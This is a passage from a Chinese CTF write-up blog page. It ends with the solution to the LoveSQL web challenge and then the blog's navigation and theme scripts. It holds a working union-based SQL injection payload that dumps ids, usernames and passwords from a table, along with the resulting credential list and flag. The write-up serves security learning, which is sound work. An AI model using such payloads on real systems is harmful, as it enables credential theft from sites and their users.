+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> l0ve1ysq1<span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>Hello 2！</p>
+<p>Your password is  ‘1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{d9614f96-0272-4d9d-a8e4-de936e0cd958}’</p>
+</blockquote>
+<p>得到flag：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">flag&#123;d9614f96<span class="token operator">-</span><span class="token number">0272</span><span class="token operator">-</span><span class="token number">4</span>d9d<span class="token operator">-</span>a8e4<span class="token operator">-</span>de936e0cd958&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">kanyun</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://kannikanyun.github.io/2022/05/12/BUU-Web-page1/">http://kannikanyun.github.io/2022/05/12/BUU-Web-page1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://KanNiKanYun.github.io" target="_blank">Kanyun's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-WEB/">CTF_WEB</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731155.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://s2.loli.net/2022/01/26/yx6wog4V9tDNiUz.jpg" target="_blank"><img class="post-qr-code-img" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/04/14/ctf.show_web9/"><img class="next-cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731435.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ctf.show_web9</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/24/CtfhubDay1/" title="CtfhubDay1"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731505.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-24</div><div class="title">CtfhubDay1</div></div></a></div><div><a href="/2022/02/18/Xctf--Web--Challenge--area%20Wp/" title="Xctf--Web--Challenge--area Wp"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-18</div><div class="title">Xctf--Web--Challenge--area Wp</div></div></a></div><div><a href="/2022/04/14/ctf.show_web9/" title="ctf.show_web9"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731435.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-14</div><div class="title">ctf.show_web9</div></div></a></div><div><a href="/2022/03/13/ctfShow-web-1~3/" title="ctfShow_web_学习记录"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730114.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-13</div><div class="title">ctfShow_web_学习记录</div></div></a></div><div><a href="/2022/04/01/ctfShow-web-4-6/" title="ctfShow-web-4-6"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730201.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-01</div><div class="title">ctfShow-web-4-6</div></div></a></div><div><a href="/2022/04/08/ctfShow-web-7-8/" title="ctfShow7_8"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-08</div><div class="title">ctfShow7_8</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="/photo/%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">kanyun</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1EK411s7qM?from=search&amp;seid=11090646219321326337&amp;spm_id_from=333.337.0.0"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://kannikanyun.github.io/" target="_blank" title="Github"><i class="我的Blog"></i></a><a class="social-icon" href="mailto:1391205637@qq.com" target="_blank" title="Email"><i class="我的邮箱"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="http://www.iceo.com.cn/"><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">这是一个随意的地方haha @</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%912019-EasySQL1"><span class="toc-number">1.</span> <span class="toc-text">1、[极客大挑2019]EasySQL1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%85%B6%E5%AE%9E%E5%BA%94%E8%AF%A5%E5%85%88%E7%AE%80%E5%8D%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9A%84"><span class="toc-number">1.1.</span> <span class="toc-text">2.其实应该先简单判断是否存在注入点的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E7%AC%AC%E4%B8%89%E6%AD%A5%E3%80%81%E5%88%A9%E7%94%A8order-by%E6%9F%A5%E8%A1%A8%E7%9A%84%E5%88%97%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">3第三步、利用order by查表的列数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%AC%AC%E5%9B%9B%E6%AD%A5%E3%80%81%E5%A6%82%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%8C%E6%89%BE%E5%88%B0%E5%9B%9E%E6%98%BE%E4%BD%8D%EF%BC%88%E5%9B%9E%E6%98%BE%EF%BC%8C%E5%B0%B1%E6%98%AF%E6%98%BE%E7%A4%BA%E6%AD%A3%E5%9C%A8%E6%89%A7%E8%A1%8C%E7%9A%84%E6%89%B9%E5%A4%84%E7%90%86%E5%91%BD%E4%BB%A4%E5%8F%8A%E6%89%A7%E8%A1%8C%E7%9A%84%E7%BB%93%E6%9E%9C%E7%AD%89%EF%BC%89"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">4.第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A%E4%B8%A4%E5%A4%84%E5%88%A4%E6%96%AD%E9%83%BD%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">法二：两处判断都绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%E3%80%81-HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">2、[HCTF 2018]WarmUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">2.1.</span> <span class="toc-text">构造payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">3.</span> <span class="toc-text">3、[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4%E3%80%81-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text">4、[强网杯 2019]随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">sql堆叠注入知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">4.2.</span> <span class="toc-text">解题步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">4.3.</span> <span class="toc-text">payload:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">5.</span> <span class="toc-text">5、[ACTF2020 新生赛]Exec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">5.1.</span> <span class="toc-text">知识点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">5.2.</span> <span class="toc-text">使用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-1"><span class="toc-number">5.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6%E3%80%81-SUCTF-2019-EasySQL"><span class="toc-number">6.</span> <span class="toc-text">6、[SUCTF 2019]EasySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-1"><span class="toc-number">6.1.</span> <span class="toc-text">知识点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">6.1.1.</span> <span class="toc-text">参考：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E8%87%B4%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">6.2.</span> <span class="toc-text">大致思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9A%E6%89%8B%E5%B7%A5%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.2.1.</span> <span class="toc-text">第一种：手工盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%EF%BC%9A"><span class="toc-number">6.2.1.1.</span> <span class="toc-text">payload：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9A%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">6.2.2.</span> <span class="toc-text">第二种：堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-2"><span class="toc-number">6.2.2.1.</span> <span class="toc-text">payload:</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File1"><span class="toc-number">7.</span> <span class="toc-text">7、[极客大挑战 2019]Secret File1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%EF%BC%9A"><span class="toc-number">7.1.</span> <span class="toc-text">题目环境：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E6%83%B3%E7%9F%A5%E9%81%93%E8%92%8B%E7%92%90%E6%BA%90%E7%9A%84%E7%A7%98%E5%AF%86%E4%B9%88%EF%BC%9F"><span class="toc-number">8.</span> <span class="toc-text">你想知道蒋璐源的秘密么？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%91%E6%8A%8A%E4%BB%96%E4%BB%AC%E9%83%BD%E6%94%BE%E5%9C%A8%E8%BF%99%E9%87%8C%E4%BA%86%EF%BC%8C%E5%8E%BB%E7%9C%8B%E7%9C%8B%E5%90%A7"><span class="toc-number">9.</span> <span class="toc-text">我把他们都放在这里了，去看看吧</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E9%98%85%E7%BB%93%E6%9D%9F"><span class="toc-number">10.</span> <span class="toc-text">查阅结束</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bp%E6%8A%93%E5%8C%85"><span class="toc-number">10.1.</span> <span class="toc-text">bp抓包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%BC%A0%E5%8F%82%EF%BC%9A"><span class="toc-number">10.2.</span> <span class="toc-text">尝试传参：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8filter%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">10.3.</span> <span class="toc-text">尝试使用filter过滤器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping1"><span class="toc-number">10.4.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%EF%BC%9A-1"><span class="toc-number">10.4.1.</span> <span class="toc-text">payload：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">10.4.2.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL1"><span class="toc-number">11.</span> <span class="toc-text">8、[极客大挑战 2019]LoveSQL1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-number">11.1.</span> <span class="toc-text">题目描述：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">11.2.</span> <span class="toc-text">思路：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Login-Success"><span class="toc-number">12.</span> <span class="toc-text">Login Success!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Login-Success-1"><span class="toc-number">13.</span> <span class="toc-text">Login Success!</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/05/12/BUU-Web-page1/" title="BUU_Web_page1"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731155.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU_Web_page1"/></a><div class="content"><a class="title" href="/2022/05/12/BUU-Web-page1/" title="BUU_Web_page1">BUU_Web_page1</a><time datetime="2022-05-12T14:07:34.000Z" title="发表于 2022-05-12 22:07:34">2022-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/14/ctf.show_web9/" title="ctf.show_web9"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731435.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctf.show_web9"/></a><div class="content"><a class="title" href="/2022/04/14/ctf.show_web9/" title="ctf.show_web9">ctf.show_web9</a><time datetime="2022-04-14T13:52:23.000Z" title="发表于 2022-04-14 21:52:23">2022-04-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/14/ctfshow_web_%E8%90%8C%E6%96%B0%E8%B5%9B%E7%AD%BE%E5%88%B0%E9%A2%98/" title="ctfshow_web_萌新赛签到题"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow_web_萌新赛签到题"/></a><div class="content"><a class="title" href="/2022/04/14/ctfshow_web_%E8%90%8C%E6%96%B0%E8%B5%9B%E7%AD%BE%E5%88%B0%E9%A2%98/" title="ctfshow_web_萌新赛签到题">ctfshow_web_萌新赛签到题</a><time datetime="2022-04-14T11:52:23.000Z" title="发表于 2022-04-14 19:52:23">2022-04-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/08/ctfShow-web-7-8/" title="ctfShow7_8"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfShow7_8"/></a><div class="content"><a class="title" href="/2022/04/08/ctfShow-web-7-8/" title="ctfShow7_8">ctfShow7_8</a><time datetime="2022-04-08T09:04:17.000Z" title="发表于 2022-04-08 17:04:17">2022-04-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/05/sql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD/" title="sql注入点判断"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731435.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sql注入点判断"/></a><div class="content"><a class="title" href="/2022/04/05/sql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD/" title="sql注入点判断">sql注入点判断</a><time datetime="2022-04-05T08:01:55.000Z" title="发表于 2022-04-05 16:01:55">2022-04-05</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731155.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By kanyun</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">不期而遇</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/no-pjax/"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
